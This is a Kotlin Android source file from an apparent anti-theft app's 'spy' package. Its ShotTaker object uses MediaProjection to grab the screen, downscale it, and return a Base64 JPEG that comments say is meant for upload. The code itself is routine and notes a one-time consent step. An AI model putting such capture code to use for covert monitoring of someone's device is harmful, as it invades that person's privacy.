package com.antimaling.permanen.spy

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Build
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.ByteArrayOutputStream

/**
 * Screenshot via MediaProjection. Izin diminta 1x lewat ShotConsentActivity.
 * Izin hangus tiap reboot -> user wajib aktifkan ulang (keterbatasan Android).
 */
object ShotTaker {
    @Volatile var projection: MediaProjection? = null

    fun hasConsent(): Boolean = try { projection != null } catch (_: Exception) { false }

    fun capture(c: Context): String? {
        val mp = try { projection } catch (_: Exception) { null } ?: return null
        var vd: android.hardware.display.VirtualDisplay? = null
        var reader: ImageReader? = null
        return try {
            val wm = c.getSystemService(WindowManager::class.java) ?: return null
            val m = DisplayMetrics()
            try {
                if (Build.VERSION.SDK_INT >= 30) {
                    val b = wm.currentWindowMetrics.bounds
                    m.widthPixels = b.width(); m.heightPixels = b.height(); m.densityDpi = 320
                } else @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(m)
            } catch (_: Exception) { return null }
            // downscale max 720p agar upload ringan
            var w = m.widthPixels; var h = m.heightPixels
            val scale = minOf(1f, 720f / w.coerceAtLeast(1))
            w = (w * scale).toInt().coerceAtLeast(2); h = (h * scale).toInt().coerceAtLeast(2)
            reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            vd = mp.createVirtualDisplay("shot", w, h, m.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
            try { Thread.sleep(500) } catch (_: Exception) {}
            val img = try { reader.acquireLatestImage() } catch (_: Exception) { null } ?: return null
            try {
                val planes = img.planes
                val buf = planes[0].buffer
                val pxStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPad = rowStride - pxStride * w
                val bmp = Bitmap.createBitmap(w + rowPad / pxStride.coerceAtLeast(1), h, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(buf)
                val crop = Bitmap.createBitmap(bmp, 0, 0, w, h)
                val out = ByteArrayOutputStream()
                crop.compress(Bitmap.CompressFormat.JPEG, 55, out)
                try { bmp.recycle() } catch (_: Exception) {}
                try { if (crop != bmp) crop.recycle() } catch (_: Exception) {}
                Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
            } finally { try { img.close() } catch (_: Exception) {} }
        } catch (_: Exception) { null }
        finally {
            try { vd?.release() } catch (_: Exception) {}
            try { reader?.close() } catch (_: Exception) {}
        }
    }
}
